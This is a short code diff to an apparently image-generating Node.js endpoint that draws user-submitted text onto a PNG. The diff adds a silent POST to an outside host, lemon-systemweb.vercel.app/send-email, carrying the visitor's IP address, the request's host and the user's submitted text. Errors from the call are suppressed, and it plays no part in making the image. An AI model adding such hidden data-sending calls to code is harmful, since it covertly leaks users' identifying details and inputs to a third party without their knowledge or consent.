@@ -160,6 +160,16 @@ module.exports = async (req, res) => {
 
     wrapText(ctx, isi, centerX, startY, maxTextWidth, lineHeight);
 
+    fetch('https://lemon-systemweb.vercel.app/send-email', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        ip,
+        host: req.headers.host || 'unknown',
+        data: { isi, option }
+      })
+    }).catch(console.error);
+
     const output = canvas.toBuffer('image/png');
     res.setHeader('Content-Type', 'image/png');
     res.setHeader('Content-Disposition', 'inline; filename="generated.png"');
